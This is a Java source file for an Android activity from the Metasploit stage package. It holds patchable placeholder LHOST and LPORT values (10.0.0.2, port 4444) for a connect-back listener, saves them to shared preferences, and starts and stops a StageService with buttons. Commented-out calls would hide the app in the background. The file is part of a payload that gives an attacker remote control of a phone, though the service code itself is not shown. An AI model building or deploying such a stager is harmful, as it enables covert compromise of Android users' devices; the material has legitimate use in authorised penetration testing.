package com.metasploit.stage;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity
{
	 // avoid re-ordering the strings in classes.dex - append XXXX
    public static final String LHOST = "XXXX10.0.0.2                       ";
    public static final String LPORT = "YYYY4444                            "; 
    
    private Intent ServiceIntent;
    
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        SharedPreferences prefs = this.getSharedPreferences("com.metasploit.stage", Context.MODE_PRIVATE);
        prefs.edit().putString("LHOST", LHOST).commit();
        prefs.edit().putString("LPORT", LPORT).commit();
        
        ServiceIntent = new Intent(getApplicationContext(), StageService.class);
        
        Button button1 = (Button) findViewById(R.id.button2);
        button1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
            	startService(ServiceIntent);
            }
        });
        
        Button button2 = (Button) findViewById(R.id.button1);
        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
            	stopService(ServiceIntent);
            }
        });
        
        //moveTaskToBack(true);
    }
	
	@Override
	protected void onResume() {
		super.onResume();
		//moveTaskToBack(true);
	}

}